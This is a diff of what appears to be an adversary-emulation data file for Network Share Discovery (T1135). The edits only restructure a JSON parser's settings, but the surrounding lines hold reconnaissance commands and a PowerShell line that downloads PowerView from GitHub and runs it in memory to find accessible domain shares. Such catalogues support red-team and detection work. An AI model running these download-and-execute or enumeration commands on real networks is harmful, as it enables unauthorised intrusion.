@@ -50,7 +50,7 @@ net share
 
 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-DomainShare -CheckShareAccess -Verbose
 
-{'windows': {'pwsh,psh': {'command': 'Get-SmbShare | ConvertTo-Json', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.smb.share', 'json_key': 'Path', 'json_type': ['str']}]}}}}
+{'windows': {'pwsh,psh': {'command': 'Get-SmbShare | ConvertTo-Json', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.smb.share', 'custom_parser_vals': {'json_key': 'Path', 'json_type': 'str'}}]}}}}
 {'windows': {'psh': {'command': 'net view \\\\#{remote.host.fqdn} /all', 'parsers': {'plugins.stockpile.app.parsers.net_view': [{'source': 'remote.host.fqdn', 'edge': 'has_share', 'target': 'remote.host.share'}]}}, 'cmd': {'command': 'net view \\\\#{remote.host.fqdn} /all', 'parsers': {'plugins.stockpile.app.parsers.net_view': [{'source': 'remote.host.fqdn', 'edge': 'has_share', 'target': 'remote.host.share'}]}}}}
 powershell/situational_awareness/network/powerview/get_dfs_share
 powershell/situational_awareness/network/powerview/get_dfs_share
@@ -100,8 +100,8 @@ python/situational_awareness/network/smb_mount
   'source': 'atomics/T1135/T1135.yaml'},
  {'command': {'windows': {'pwsh,psh': {'command': 'Get-SmbShare | '
                                                   'ConvertTo-Json',
-                                       'parsers': {'plugins.stockpile.app.parsers.json': [{'json_key': 'Path',
-                                                                                           'json_type': ['str'],
+                                       'parsers': {'plugins.stockpile.app.parsers.json': [{'custom_parser_vals': {'json_key': 'Path',
+                                                                                                                  'json_type': 'str'},
                                                                                            'source': 'domain.smb.share'}]}}}},
   'name': 'Network Share Discovery',
   'source': 'data/abilities/discovery/530e47c6-8592-42bf-91df-c59ffbd8541b.yml'},
@@ -468,8 +468,8 @@ python/situational_awareness/network/smb_mount
                                                 'platforms': {'windows': {'pwsh,psh': {'command': 'Get-SmbShare '
                                                                                                   '| '
                                                                                                   'ConvertTo-Json',
-                                                                                       'parsers': {'plugins.stockpile.app.parsers.json': [{'json_key': 'Path',
-                                                                                                                                           'json_type': ['str'],
+                                                                                       'parsers': {'plugins.stockpile.app.parsers.json': [{'custom_parser_vals': {'json_key': 'Path',
+                                                                                                                                                                  'json_type': 'str'},
                                                                                                                                            'source': 'domain.smb.share'}]}}}},
                                                 'tactic': 'discovery',
                                                 'technique': {'attack_id': 'T1135',
